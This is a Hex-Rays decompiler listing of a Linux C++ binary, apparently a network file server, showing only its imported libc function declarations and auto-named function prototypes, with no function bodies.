/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: GNU C++
*/

#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

__int64 (**init_proc())(void);
void sub_3AF0();
// const __int32_t **__ctype_toupper_loc(void);
// const char *inet_ntop(int af, const void *cp, char *buf, socklen_t len);
// int utime(const char *file, const struct utimbuf *file_times);
// int sigprocmask(int how, const sigset_t *set, sigset_t *oset);
// __int64 __snprintf_chk(_QWORD, _QWORD, _QWORD, _QWORD, const char *, ...); weak
// void free(void *ptr);
// ssize_t recv(int fd, void *buf, size_t n, int flags);
// struct tm *localtime(const time_t *timer);
// int *__errno_location(void);
// char *strncpy(char *dest, const char *src, size_t n);
// void __noreturn _exit(int status);
// int chroot(const char *path);
// ssize_t sendmsg(int fd, const struct msghdr *message, int flags);
// void qsort(void *base, size_t nmemb, size_t size, __compar_fn_t compar);
// int sigaction(int sig, const struct sigaction *act, struct sigaction *oact);
// int setsockopt(int fd, int level, int optname, const void *optval, socklen_t optlen);
// ssize_t readlink(const char *path, char *buf, size_t len);
// int fcntl(int fd, int cmd, ...);
// ssize_t write(int fd, const void *buf, size_t n);
// char *inet_ntoa(struct in_addr in);
// void endutxent(void);
// int getpeername(int fd, struct sockaddr *addr, socklen_t *len);
// int __xstat64(int ver, const char *filename, struct stat64 *stat_buf);
// struct passwd *getpwuid(__uid_t uid);
// int shutdown(int fd, int how);
// size_t strlen(const char *s);
// __uid_t getuid(void);
// void *mmap(void *addr, size_t len, int prot, int flags, int fd, __off_t offset);
// int dup2(int fd, int fd2);
// struct group *getgrgid(__gid_t gid);
// __int64 __fastcall __fdelt_chk(_QWORD); weak
// int nanosleep(const struct timespec *requested_time, struct timespec *remaining);
// int setrlimit64(__rlimit_resource_t resource, const struct rlimit64 *rlimits);
// int gettimeofday(struct timeval *tv, __timezone_ptr_t tz);
// void *memset(void *s, int c, size_t n);
// __uid_t geteuid(void);
// char *getcwd(char *buf, size_t size);
// void updwtmpx(const char *wtmpx_file, const struct utmpx *utmpx);
// unsigned int alarm(unsigned int seconds);
// int close(int fd);
// int setgroups(size_t n, const __gid_t *groups);
// char *crypt(const char *key, const char *salt);
// __pid_t setsid(void);
// int closedir(DIR *dirp);
// char *getusershell(void);
// ssize_t read(int fd, void *buf, size_t nbytes);
// void srand(unsigned int seed);
// int memcmp(const void *s1, const void *s2, size_t n);
// int getsockopt(int fd, int level, int optname, void *optval, socklen_t *optlen);
// struct utmpx *pututxline(const struct utmpx *utmpx);
// int putenv(char *string);
// int __fxstat64(int ver, int fildes, struct stat64 *stat_buf);
// int dirfd(DIR *dirp);
// struct passwd *getpwnam(const char *name);
// struct hostent *gethostbyname(const char *name);
// void setutxent(void);
// __int64 syscall(__int64 sysno, ...);
// int sigemptyset(sigset_t *set);
// __mode_t umask(__mode_t mask);
// __int64 strtol(const char *nptr, char **endptr, int base);
// int sigfillset(sigset_t *set);
// void *memcpy(void *dest, const void *src, size_t n);
// int socketpair(int domain, int type, int protocol, int fds[2]);
// int prctl(int option, ...);
// void tzset(void);
// time_t time(time_t *timer);
// int select(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout);
// int inet_aton(const char *cp, struct in_addr *inp);
// __int64 __fastcall __open64_2(_QWORD, _QWORD); weak
// void *malloc(size_t size);
// int listen(int fd, int n);
// __gid_t getegid(void);
// time_t mktime(struct tm *tp);
// int setreuid(__uid_t ruid, __uid_t euid);
// ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);
// int setregid(__gid_t rgid, __gid_t egid);
// void *realloc(void *ptr, size_t size);
// int munmap(void *addr, size_t len);
// ssize_t recvmsg(int fd, struct msghdr *message, int flags);
// int ftruncate64(int fd, __off64_t length);
// int fchmod(int fd, __mode_t mode);
// int chmod(const char *file, __mode_t mode);
// int bind(int fd, const struct sockaddr *addr, socklen_t len);
// int open64(const char *file, int oflag, ...);
// size_t strftime(char *s, size_t maxsize, const char *format, const struct tm *tp);
// __int64 __syslog_chk(_QWORD, _QWORD, const char *, ...); weak
// struct dirent64 *readdir64(DIR *dirp);
// int setgid(__gid_t gid);
// __pid_t waitpid(__pid_t pid, int *stat_loc, int options);
// __pid_t getpgrp(void);
// int mprotect(void *addr, size_t len, int prot);
// struct spwd *getspnam(const char *name);
// int access(const char *name, int type);
// int fchown(int fd, __uid_t owner, __gid_t group);
// struct tm *gmtime(const time_t *timer);
// int accept(int fd, struct sockaddr *addr, socklen_t *addr_len);
// int getsockname(int fd, struct sockaddr *addr, socklen_t *len);
// int __lxstat64(int ver, const char *filename, struct stat64 *stat_buf);
// void openlog(const char *ident, int option, int facility);
// int getpagesize(void);
// void __noreturn exit(int status);
// int connect(int fd, const struct sockaddr *addr, socklen_t len);
// __off64_t lseek64(int fd, __off64_t offset, int whence);
// int setuid(__uid_t uid);
// int execl(const char *path, const char *arg, ...);
// int initgroups(const char *user, __gid_t group);
// void endusershell(void);
// __pid_t wait(__WAIT_STATUS stat_loc);
// int sigaddset(sigset_t *set, int signo);
// __pid_t fork(void);
// int rand(void);
// const unsigned __int16 **__ctype_b_loc(void);
// int socket(int domain, int type, int protocol);
// int __fastcall _cxa_finalize(void *);
void __fastcall __noreturn start(__int64 a1, __int64 a2, void (*a3)(void));
char ***sub_4A50();
__int64 sub_4A90(void); // weak
char ***sub_4AE0();
__int64 __fastcall sub_4B20(_QWORD, _QWORD, _QWORD); // weak
void __fastcall __noreturn sub_4B30(const char *a1);
void __noreturn sub_4B80();
void __fastcall __noreturn sub_4BA0(const char *a1, const char *a2);
void __noreturn sub_4BF3(); // weak
void __fastcall __noreturn sub_4C20(const char *a1);
int __fastcall sub_4C40(__int64 a1);
void __fastcall __noreturn sub_4D00(__int64 a1);
int __fastcall sub_53B0(__int64 a1, int a2, char a3, __int64 a4, int a5);
unsigned int __fastcall sub_5510(__int64 a1);
unsigned __int64 sub_5540();
int __fastcall sub_5560(__int64 a1, int a2, const char *a3);
int __fastcall sub_55A0(__int64 a1, int a2, const char *a3);
__int64 __fastcall sub_55E0(__int64 a1, const char *a2);
void __fastcall __noreturn sub_5640(__int64 a1, int a2, const char *a3);
void __fastcall __noreturn sub_5690(__int64 a1);
int __fastcall sub_56A0(__int64 a1, int a2, __int64 a3);
int __fastcall sub_56B0(__int64 a1, int a2, __int64 a3);
unsigned int __fastcall sub_56C0(__int64 a1);
__int64 __fastcall sub_56E0(__int64 a1, __int64 *a2, __int64 a3, int a4);
unsigned __int64 __fastcall sub_58B0(__int64 a1);
__int64 __fastcall sub_59D0(__int64 a1);
int __fastcall sub_59F0(__int64 a1, int a2);
__int64 __fastcall sub_5CC0(__int64 a1);
int __fastcall sub_5D70(__int64 a1);
__int64 __fastcall sub_5D90(char **a1, __int64 a2);
int __fastcall sub_5EB0(__int64 a1);
__int64 __fastcall sub_5F30(__int64 a1);
__int64 __fastcall sub_5F60(__int64 a1);
__int64 __fastcall sub_5FD0(__int64 a1, const char *a2);
__int64 __fastcall sub_60A0(__int64 a1);
int __fastcall sub_6160(__int64 a1, int a2);
int __fastcall sub_6540(__int64 a1, int a2, int a3);
unsigned __int64 __fastcall sub_6990(__int64 a1, int a2, int a3);
void __fastcall __noreturn sub_6EC0(_WORD **a1);
__int64 __fastcall sub_8F60(__int64 a1);
int __fastcall sub_8FB0(__int64 a1);
int __fastcall sub_8FF0(__int64 a1);
int __fastcall sub_9030(__int64 a1);
__int64 __fastcall sub_9070(unsigned int a1, char a2);
__int64 __fastcall sub_90A0(unsigned int a1);
__int64 __fastcall sub_9100(unsigned int a1);
__int64 __fastcall sub_9160(unsigned int a1, char a2);
__int64 __fastcall sub_9190(_QWORD, _QWORD); // weak
__int64 __fastcall sub_91A0(_QWORD); // weak
__int64 __fastcall sub_91B0(unsigned int a1, int a2);
__int64 __fastcall sub_91E0(unsigned int a1, _QWORD *a2);
__int64 __fastcall sub_9220(unsigned int fd, __int64 a2, int a3);
__int64 __fastcall sub_9260(unsigned int a1);
__int64 __fastcall sub_92C0(unsigned int fd, __int64 a2, unsigned int a3);
__int64 __fastcall sub_9330(unsigned int a1, __int64 *a2);
char *__fastcall sub_93A0(char *s, void **a2);
void sub_93D0();
__int64 __fastcall sub_9AB0(__int64 a1, int a2, DIR *a3, __int64 a4, __int64 a5, __int64 a6, int a7);
unsigned int __fastcall sub_9EF0(__int64 a1);
__int64 __fastcall sub_9F50(__int64 a1);
unsigned int __fastcall sub_9F80(__int64 a1, int a2);
void __fastcall sub_9FE0(signed int a1, int a2, _DWORD *a3);
__int64 __fastcall sub_A0D0(__int64 a1);
__int64 __fastcall sub_A1B0(__int64 a1);
__int64 __fastcall sub_A230(_WORD **a1);
__int64 __fastcall sub_A2B0(unsigned int *a1);
__int64 __fastcall sub_A3A0(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
__int64 __fastcall sub_A3B0(unsigned int *a1, unsigned int a2, unsigned int a3, int a4, int a5);
unsigned int __fastcall sub_A7B0(unsigned __int64 *a1);
int __fastcall sub_A800(unsigned __int64 *a1, unsigned int a2);
_BOOL8 __fastcall sub_A8D0(__int64 a1, __int64 a2, _DWORD *a3);
unsigned __int64 __fastcall sub_ACF0(__int64 a1, __int64 a2, DIR *a3, __int64 a4, __int64 a5, __int64 a6, int a7);
void __fastcall __noreturn sub_B4F0(_DWORD *a1, __int64 a2);
__int64 __fastcall sub_B730(unsigned int fd);
__int64 __fastcall sub_B7A0(__int64 a1, int a2, int a3, __int64 a4);
__int64 __fastcall sub_BD60(__int64 a1, int a2, int a3, __int64 a4);
__int64 __fastcall sub_C060(__int64 a1);
__suseconds_t __fastcall sub_C1A0(_QWORD *a1, unsigned int a2);
__int64 __fastcall sub_C230(__int64 a1, int a2, __int64 a3);
_BOOL8 __fastcall sub_C240(__int64 a1);
void __fastcall sub_C250(__int64 a1);
__int64 __fastcall sub_C260(__int64 a1, int a2);
__int64 __fastcall sub_C290(__int64 a1, const void *a2, unsigned int a3);
__int64 __fastcall sub_C310(char **a1, const void *a2, int a3);
__int64 __fastcall sub_C370(__int64 a1, const char *a2);
__int64 __fastcall sub_C3A0(__int64 a1, __int64 a2);
__int64 __fastcall sub_C3B0(__int64 a1, _BYTE *a2, char a3);
__int64 __fastcall sub_C3E0(__int64 a1, __int64 a2);
__int64 __fastcall sub_C410(__int64 a1, __int64 a2);
void __fastcall sub_C440(__int64 a1);
__int64 __fastcall sub_C470(__int64 *a1, unsigned int a2);
_BYTE *__fastcall sub_C4B0(__int64 a1, int a2);
_BOOL8 __fastcall sub_C4F0(__int64 a1);
__int64 __fastcall sub_C500(__int64 a1);
__int64 __fastcall sub_C510(_QWORD *a1);
char *__fastcall sub_C550(_QWORD *a1);
_BYTE *__fastcall sub_C570(__int64 a1);
int __fastcall sub_C5A0(__int64 a1, __int64 a2);
_BOOL8 __fastcall sub_C5E0(__int64 a1, __int64 a2);
_BOOL8 __fastcall sub_C600(__int64 a1, const char *a2);
__int64 __fastcall sub_C660(char **a1, __int64 a2);
__int64 __fastcall sub_C670(char **a1, const char *a2);
__int64 __fastcall sub_C6A0(char **a1, char a2);
__int64 __fastcall sub_C6C0(char **a1, __int64 a2);
__int64 __fastcall sub_C6F0(char **a1, __int64 a2);
__int64 __fastcall sub_C720(char **a1, double a2);
__int64 __fastcall sub_C750(__int64 a1);
unsigned __int64 __fastcall sub_C7A0(__int64 a1, unsigned int a2);
unsigned __int64 __fastcall sub_C810(__int64 a1, unsigned int a2);
_BYTE *__fastcall sub_C8D0(__int64 a1, char a2, char a3);
__int64 __fastcall sub_C900(__int64 a1, const char *a2);
__int64 __fastcall sub_C9C0(__int64 a1, const char *a2);
__int64 __fastcall sub_CA50(__int64 a1, _QWORD *a2);
__int64 __fastcall sub_CA70(__int64 a1, char a2);
__int64 __fastcall sub_CAC0(__int64 a1, const char *a2);
_BYTE *__fastcall sub_CB50(__int64 a1, __int64 a2, const char *a3, int a4);
_BYTE *__fastcall sub_CC40(__int64 a1, __int64 a2, const char *a3);
__int64 __fastcall sub_CC50(__int64 a1, const char *a2, const char *a3);
unsigned __int64 __fastcall sub_CD40(__int64 a1, __int64 a2, char a3);
unsigned __int64 __fastcall sub_CDA0(__int64 a1, __int64 a2, char a3);
__int64 __fastcall sub_CDF0(__int64 a1, _QWORD *a2);
__int64 __fastcall sub_CE10(__int64 a1, __int64 a2, unsigned int a3);
__int64 __fastcall sub_CE50(__int64 a1, __int64 a2, unsigned int a3);
__int64 __fastcall sub_CEA0(__int64 a1, __int64 a2, unsigned int a3);
__int64 __fastcall sub_CEE0(__int64 a1, unsigned int a2);
__int64 __fastcall sub_CF10(__int64 a1);
__int64 __fastcall sub_CF90(__int64 a1);
__int64 __fastcall sub_CFF0(__int64 a1);
__int64 __fastcall sub_D050(_QWORD *a1);
__int64 __fastcall sub_D070(_QWORD *a1);
__int64 __fastcall sub_D090(_QWORD *a1);
__int64 __fastcall sub_D0B0(__int64 a1, __int64 a2, unsigned int *a3);
__int64 __fastcall sub_D180(__int64 a1, __int64 a2);
__int64 __fastcall sub_D210(__int64 a1, char a2);
__int64 __fastcall sub_D270(__int64 a1, __int64 a2, char a3, _BYTE *a4, unsigned int a5, __int64 (__fastcall *a6)(__int64, _BYTE *, _QWORD), __int64 (__fastcall *a7)(__int64, _BYTE *, _QWORD));
__int64 __fastcall sub_D460(_QWORD *a1, unsigned int a2);
__int64 __fastcall sub_D4C0(__int64 *a1, unsigned int a2, unsigned int a3);
char *__fastcall sub_D520(__int64 a1);
__int64 __fastcall sub_D580(_QWORD *a1, unsigned int a2);
__int64 __fastcall sub_D5B0(_QWORD *a1, unsigned int a2);
int __fastcall sub_D5E0(_QWORD *a1, __mode_t a2);
int __fastcall sub_D600(_QWORD *a1);
int __fastcall sub_D620(_QWORD *a1);
int __fastcall sub_D640(_QWORD *a1);
__int64 __fastcall sub_D660(_QWORD *a1, int a2);
int __fastcall sub_D6A0(_QWORD *a1, struct stat64 **a2);
int __fastcall sub_D6C0(_QWORD *a1, struct stat64 **a2);
int __fastcall sub_D6E0(_QWORD *a1);
int __fastcall sub_D700(_QWORD *a1);
int __fastcall sub_D720(_QWORD *a1, __int16 a2);
int __fastcall sub_D740(_QWORD *a1, _QWORD *a2);
DIR *__fastcall sub_D770(_QWORD *a1);
_BYTE *__fastcall sub_D790(__int64 a1, DIR *a2);
__int64 __fastcall sub_D7D0(__int64 a1, _QWORD *a2);
struct passwd *__fastcall sub_D850(_QWORD *a1);
__int64 __fastcall sub_D870(_QWORD *a1, int a2);
int __fastcall compar(char *a1, char *a2);
int __fastcall sub_D8D0(__int64 a1, __int64 a2);
void __fastcall sub_D910(__int64 a1);
__int64 __fastcall sub_D980(__int64 a1);
__int64 __fastcall sub_D990(__int64 a1, __int64 a2);
__int64 __fastcall sub_D9F0(__int64 a1, __int64 a2, __int64 a3);
void __fastcall sub_DAA0(__int64 a1, int a2);
__int64 __fastcall sub_DAE0(__int64 a1, unsigned int a2);
unsigned __int64 __fastcall sub_DB20(__int64 a1, __int64 a2, int a3);
unsigned __int64 __fastcall sub_DBC0(__int64 a1, int a2);
__int64 __fastcall sub_DCF0(__int64 a1, __int64 a2, unsigned int a3);
char *__fastcall sub_DE20(const char *a1, int a2);
unsigned __int64 __fastcall sub_E110(char *s, int a2);
unsigned __int64 __fastcall sub_E310(_QWORD *a1, __int64 a2, _QWORD *a3, int a4, char a5);
unsigned __int64 __fastcall sub_E600(_BYTE *a1, unsigned int a2, int a3);
__int64 __fastcall sub_E6C0(char *a1, _WORD *a2, unsigned int a3, __int64 a4);
void __fastcall __noreturn sub_E740(__int64 a1);
void __fastcall __noreturn sub_E850(__int64 a1);
__int64 __fastcall sub_E8E0(__int64 a1, _QWORD *a2);
__int64 __fastcall sub_E920(_WORD **a1);
__int64 __fastcall sub_E940(_QWORD); // weak
_BOOL8 __fastcall sub_E950(__int64);
__int64 __fastcall sub_E960(_QWORD); // weak
__int64 sub_E970(void); // weak
__int64 __fastcall sub_E980(_QWORD, _QWORD); // weak
void __noreturn sub_E990(); // weak
void __noreturn sub_EA20(); // weak
void __fastcall __noreturn sub_EA40(_DWORD *a1, __int64 *a2, int a3, int a4);
void __fastcall __noreturn sub_EFF0(__int64 a1);
__int64 __fastcall sub_F400(__int64 a1, _QWORD *a2);
__int64 __fastcall sub_F4C0(__int64 a1);
__int64 __fastcall sub_F540(__int64 a1);
__int64 __fastcall sub_F580(__int64 a1);
__int64 __fastcall sub_F5A0(__int64 a1);
__int64 __fastcall sub_F5D0(__int64 a1);
__int64 __fastcall sub_F630(__int64 a1, unsigned int a2);
unsigned __int64 __fastcall sub_F690(__int64 a1, __int64 a2);
__int64 __fastcall sub_F710(_WORD **a1, __int16 a2, int a3);
int __fastcall sub_F870(__int64 a1);
_BOOL8 __fastcall sub_F8A0(__int64 a1);
__int64 __fastcall sub_F8B0(__int64 a1, __int64 a2);
__int64 __fastcall sub_FA50(__int64 a1);
int __fastcall sub_FB10(_DWORD *a1, int a2);
__int64 __fastcall sub_FBC0(_QWORD *a1, _QWORD *a2);
__int64 __fastcall sub_FF00(unsigned int a1, unsigned __int8 *a2);
__int64 __fastcall sub_FF40(unsigned int a1, _DWORD *a2);
unsigned __int64 sub_FF50();
void __fastcall sub_FF70(const void *a1);
unsigned __int64 sub_FFF0();
__int64 sub_10080();
_DWORD *__fastcall sub_10580(int a1, int a2, int a3, __int64 a4);
__int64 __fastcall sub_105E0(unsigned int *a1);
__int64 __fastcall sub_10620(unsigned int *a1, const void *a2);
__int64 __fastcall sub_10670(unsigned int *a1, const void *a2);
__int64 __fastcall sub_10690(unsigned int *a1, const void *a2, const void *a3);
void __fastcall sub_10740(unsigned int *a1, const void *a2);
void __noreturn sub_107D0();
_BOOL8 __fastcall sub_107F0(char **a1, __int64 a2);
__int64 __fastcall sub_10A30(__int64 a1);
_BYTE *__fastcall sub_10B30(__int64 a1, char a2, _BYTE *a3, int a4);
_BYTE *__fastcall sub_10C10(__int64 a1);
_BOOL8 __fastcall sub_10C30(__int64 a1);
_BOOL8 __fastcall sub_10CF0(__int64 a1);
int __fastcall sub_10DB0(__int64 a1);
__int64 sub_10F00(); // weak
__int64 sub_10F20(); // weak
__int64 __fastcall sub_10F40(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_10F50(__int64 a1, void *a2, size_t a3);
__int64 __fastcall sub_10F60(__int64 a1, _QWORD *a2, int a3);
__int64 __fastcall sub_11080(unsigned int *a1, void *a2, size_t a3);
__int64 __fastcall sub_11110(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_111A0(_DWORD *a1, __int64 *a2, _BYTE *a3);
int __fastcall sub_11250(__int64 a1);
void __noreturn sub_112B0();
__int64 __fastcall nullsub_1(_QWORD); // weak
__int64 __fastcall nullsub_2(_QWORD); // weak
__int64 __fastcall nullsub_3(_QWORD); // weak
__int64 __fastcall nullsub_4(_QWORD); // weak
__int64 __fastcall sub_11320(_QWORD); // weak
__int64 __fastcall sub_11330(_QWORD, _QWORD); // weak
__int64 __fastcall sub_11340(_QWORD, _QWORD); // weak
__int64 __fastcall sub_11350(_QWORD); // weak
__int64 __fastcall nullsub_5(_QWORD); // weak
__int64 __fastcall nullsub_6(_QWORD); // weak
__int64 __fastcall nullsub_7(_QWORD); // weak
__int64 __fastcall sub_113A0(_QWORD, _QWORD, _QWORD); // weak
void __fastcall __noreturn sub_113B0(__int64 a1);
__int64 sub_11640(void); // weak
__int64 __fastcall nullsub_9(_QWORD); // weak
__int64 __fastcall sub_11660(_QWORD, _QWORD, _QWORD); // weak
__int64 __fastcall sub_11670(_QWORD); // weak
__int64 nullsub_10(void); // weak
__int64 nullsub_11(void); // weak
__int64 __fastcall nullsub_12(_QWORD); // weak
__int64 __fastcall nullsub_13(_QWORD); // weak
__int64 __fastcall nullsub_14(_QWORD); // weak
__int64 __fastcall nullsub_15(_QWORD); // weak
__int64 __fastcall nullsub_16(_QWORD); // weak
__int64 __fastcall nullsub_17(_QWORD); // weak
__int64 __fastcall nullsub_18(_QWORD); // weak
__int64 __fastcall nullsub_19(_QWORD); // weak
__int64 __fastcall nullsub_20(_QWORD); // weak
__int64 __fastcall nullsub_21(_QWORD); // weak
__int64 __fastcall nullsub_22(_QWORD); // weak
__int64 __fastcall nullsub_23(_QWORD); // weak
__int64 __fastcall nullsub_24(_QWORD, _QWORD); // weak
__int64 __fastcall nullsub_25(_QWORD); // weak
__int64 __fastcall nullsub_26(_QWORD); // weak
__int64 __fastcall nullsub_27(_QWORD); // weak
__int64 __fastcall nullsub_28(_QWORD); // weak
__int64 __fastcall nullsub_29(_QWORD); // weak
__int64 __fastcall nullsub_30(_QWORD); // weak
__int64 __fastcall nullsub_31(_QWORD); // weak
__int64 __fastcall nullsub_32(_QWORD); // weak
__int64 __fastcall nullsub_33(_QWORD); // weak
__int64 __fastcall nullsub_34(_QWORD); // weak
__int64 __fastcall nullsub_35(_QWORD); // weak
__int64 __fastcall nullsub_37(_QWORD); // weak
__int64 __fastcall nullsub_38(_QWORD); // weak
__int64 __fastcall sub_11870(_QWORD, _QWORD, _QWORD); // weak
__int64 __fastcall sub_11890(_QWORD, _QWORD, _QWORD, _QWORD); // weak
__int64 __fastcall nullsub_40(_QWORD); // weak
__int64 __fastcall nullsub_41(_QWORD); // weak
__int64 __fastcall nullsub_42(_QWORD); // weak
__int64 __fastcall nullsub_43(_QWORD); // weak
__int64 __fastcall nullsub_44(_QWORD); // weak
__int64 __fastcall nullsub_45(_QWORD); // weak
__int64 __fastcall nullsub_46(_QWORD); // weak
__int64 __fastcall nullsub_47(_QWORD); // weak
__int64 __fastcall nullsub_48(_QWORD); // weak
__int64 __fastcall nullsub_49(_QWORD, _QWORD, _QWORD); // weak
__int64 __fastcall nullsub_50(_QWORD); // weak
__int64 __fastcall nullsub_51(_QWORD, _QWORD, _QWORD); // weak
__int64 __fastcall nullsub_52(_QWORD); // weak
__int64 __fastcall nullsub_53(_QWORD, _QWORD, _QWORD); // weak
__int64 __fastcall nullsub_54(_QWORD); // weak
__int64 __fastcall nullsub_55(_QWORD); // weak
__int64 __fastcall nullsub_56(_QWORD); // weak
__int64 __fastcall nullsub_57(_QWORD, _QWORD, _QWORD); // weak
__int64 __fastcall nullsub_58(_QWORD); // weak
__int64 __fastcall nullsub_59(_QWORD, _QWORD, _QWORD); // weak
__int64 __fastcall nullsub_60(_QWORD); // weak
__int64 __fastcall sub_119F0(__int64 a1);
__int64 __fastcall sub_11A80(__int64 a1);
__int64 __fastcall sub_11B60(__int64 a1, _WORD **a2);
__int64 __fastcall sub_11C00(__int64 a1, _WORD **a2);
__int64 __fastcall sub_11D90(__int64 a1, __int64 a2);
unsigned int sub_120B0();
__int64 __fastcall sub_120C0(int a1);
int __fastcall sub_12160(unsigned int a1);
void *__fastcall sub_121A0(void *a1, unsigned int a2);
unsigned __int64 __fastcall sub_121B0(int sig, void (*a2)(int));
void *__fastcall sub_12250(void *dest, const void *a2, int a3);
__int64 __fastcall sub_122A0(char *a1, const char *a2, unsigned int a3);
int __fastcall sub_122C0(int a1, int a2);
char *sub_122F0();
__int64 __fastcall sub_12360(int a1, unsigned int a2, unsigned int a3);
__int64 __fastcall sub_12440(int fd, __int16 a2);
unsigned __int64 __fastcall sub_124F0(int a1, __int64 a2, __int64 a3, unsigned int a4);
unsigned int *__fastcall sub_12570(int a1);
unsigned __int64 __fastcall sub_125B0(int a1);
unsigned __int64 __fastcall sub_125F0(int a1);
unsigned __int64 __fastcall sub_126A0(int a1, void (*a2)(int));
unsigned __int64 __fastcall sub_126F0(int a1);
void __fastcall sub_127A0(__int64 (__fastcall *a1)(_QWORD, _QWORD, _QWORD), __int64 a2);
void sub_127E0();
unsigned int j__alarm(unsigned int seconds);
unsigned int sub_12830();
__int64 __fastcall sub_12840(unsigned int fd, void *buf, size_t nbytes);
__int64 __fastcall sub_128B0(unsigned int fd, void *buf, size_t n);
__int64 __fastcall sub_12920(unsigned int fd, __int64 a2, int a3);
__int64 __fastcall sub_129A0(unsigned int fd, __int64 a2, int a3);
__off64_t __fastcall sub_12A20(int a1);
__off64_t __fastcall sub_12A60(int fd, __off64_t a2);
__off64_t __fastcall sub_12AB0(int a1);
void *__fastcall sub_12AE0(size_t size);
void *__fastcall sub_12B40(void *ptr, size_t size);
void __fastcall sub_12BB0(void *ptr);
__int64 sub_12BE0(void); // weak
__pid_t sub_12C10();
__pid_t sub_12C60();
void __fastcall __noreturn sub_12C90(int status); // idb
__int64 sub_12CC0(void); // weak
__int64 sub_12D40(void); // weak
__int64 __fastcall sub_12D90(unsigned int *a1);
_BOOL8 __fastcall sub_12DA0(__int64 a1);
__int64 __fastcall sub_12DB0(__int64 a1);
unsigned __int64 __fastcall sub_12DE0(int a1);
unsigned __int64 __fastcall sub_12E40(int a1);
unsigned __int64 __fastcall sub_12EA0(int a1);
int __fastcall sub_12F00(int a1);
unsigned __int64 __fastcall sub_12F60(int a1);
unsigned __int64 __fastcall sub_12FC0(int a1);
unsigned __int64 __fastcall sub_13010(int fd);
unsigned __int64 __fastcall sub_13090(int a1);
int __fastcall sub_130E0(int fd);
int __fastcall sub_13150(int fd);
__int64 __fastcall sub_131C0(unsigned int fd, void *buf, size_t n);
__int64 __fastcall sub_13230(const char *a1);
__int64 __fastcall sub_13250(const char *a1);
void *__fastcall sub_132D0(__int64 a1);
void *__fastcall sub_13310(__int64 a1);
void *__fastcall sub_13350(double a1);
__int16 *__fastcall sub_13390(unsigned int a1);
__int64 __fastcall sub_133F0(char *a1);
__int64 __fastcall sub_13460(unsigned int a1);
__int64 __fastcall sub_13490(int a1);
__int64 __fastcall sub_134B0(int a1);
__int64 __fastcall sub_134F0(int a1);
__int64 __fastcall sub_13510(int a1);
char *__fastcall sub_13530(char *a1, unsigned int a2);
int j__mkdir(const char *path, __mode_t mode);
int j__rmdir(const char *path);
int j__chdir(const char *path);
int j__rename(const char *old, const char *new);
DIR *j__opendir(const char *name);
int __fastcall sub_135C0(DIR *a1);
char *__fastcall sub_135F0(DIR *a1);
size_t __fastcall sub_13610(const char *a1);
char *j__strdup(const char *s);
void *__fastcall sub_13650(void *a1, unsigned int a2);
void *__fastcall sub_13670(void *a1, const void *a2, int a3);
__int64 __fastcall sub_13690(char *a1, const char *a2, unsigned int a3);
int __fastcall sub_136B0(const void *a1, const void *a2, unsigned int a3);
int j__strcmp(const char *s1, const char *s2);
int sub_136E0();
int __fastcall sub_13730(void *addr, size_t len, int a3);
int __fastcall sub_137A0(void *a1, unsigned int a2);
__int64 __fastcall sub_137D0(__int64 a1, int a2);
int __fastcall sub_13840(const char *a1, unsigned int a2);
int __fastcall sub_13850(const char *a1, unsigned int a2);
int __fastcall sub_13860(int a1, int a2);
int __fastcall sub_13880(int fd);
int j__close(int fd);
int j__unlink(const char *name);
_BOOL8 __fastcall sub_138E0(const char *a1);
int __fastcall sub_13900(int fildes, struct stat64 **a2);
int __fastcall sub_13960(char *filename, struct stat64 **a2);
int __fastcall sub_139B0(char *filename, struct stat64 **a2);
int __fastcall sub_13A00(DIR *a1, struct stat64 **a2);
_BOOL8 __fastcall sub_13A20(__int64 a1);
_BOOL8 __fastcall sub_13A40(__int64 a1);
_BOOL8 __fastcall sub_13A60(__int64 a1);
_BOOL8 __fastcall sub_13A80(__int64 a1);
char *__fastcall sub_13AA0(__int64 a1);
char *__fastcall sub_13C60(__int64 a1, int a2, __int64 a3);
char *__fastcall sub_13CF0(__int64 a1, int a2);
__int64 __fastcall sub_13D50(__int64 a1);
__int64 __fastcall sub_13D80(__int64 a1);
__int64 __fastcall sub_13D90(__int64 a1);
__int64 __fastcall sub_13DA0(__int64 a1);
__int64 __fastcall sub_13DB0(__int64 a1);
void *__fastcall sub_13DC0(__int64 a1);
int __fastcall sub_13E00(int a1, __uid_t a2, __gid_t a3);
int __fastcall sub_13E30(int a1, __int16 a2);
int __fastcall sub_13E60(const char *a1, __int16 a2);
__int64 __fastcall sub_13E70(int a1);
__int64 __fastcall sub_13E80(int a1);
unsigned __int64 __fastcall sub_13E90(int fd);
ssize_t __fastcall sub_13F10(const char *a1, char *a2, int a3);
__int64 __fastcall sub_13F40(unsigned int a1);
__int64 sub_13F50(void); // weak
int sub_13FC0();
int sub_14010();
__int64 sub_14060(void); // weak
int __fastcall sub_140D0(int fd, const struct sockaddr *a2);
__int64 __fastcall sub_14120(int a1, int a2);
__int64 __fastcall sub_14150(int fd, void *a2, unsigned int a3);
__int64 __fastcall sub_14330(int fd, const struct sockaddr *a2, unsigned int a3);
int __fastcall sub_14530(int a1);
int __fastcall sub_14540(int a1);
void __fastcall sub_14550(void **a1);
void *__fastcall sub_14580(void **a1);
unsigned __int64 __fastcall sub_145C0(int fd, void **a2);
unsigned __int64 __fastcall sub_146B0(int fd, void **a2);
void *__fastcall sub_147A0(void **a1);
void *__fastcall sub_147C0(void **a1);
void *__fastcall sub_147E0(void **a1, __int64 a2);
_BOOL8 __fastcall sub_14880(unsigned __int16 *a1, unsigned __int16 *a2);
_BOOL8 __fastcall sub_14950(_WORD *a1);
void *__fastcall sub_14960(_WORD *a1, const void *a2);
void *__fastcall sub_14A10(_WORD *a1, const void *a2);
__int64 __fastcall sub_14A40(__int64 a1);
_WORD *__fastcall sub_14AB0(_WORD *a1);
__int64 sub_14AF0(void); // weak
int __fastcall sub_14B00(_WORD *a1);
void *__fastcall sub_14B40(_WORD *a1);
__int16 __fastcall sub_14B80(_WORD *a1);
__int64 __fastcall sub_14BC0(unsigned __int16 *a1, __int16 a2);
_BOOL8 __fastcall sub_14BF0(unsigned __int16 a1);
char *__fastcall sub_14C00(__int64 a1);
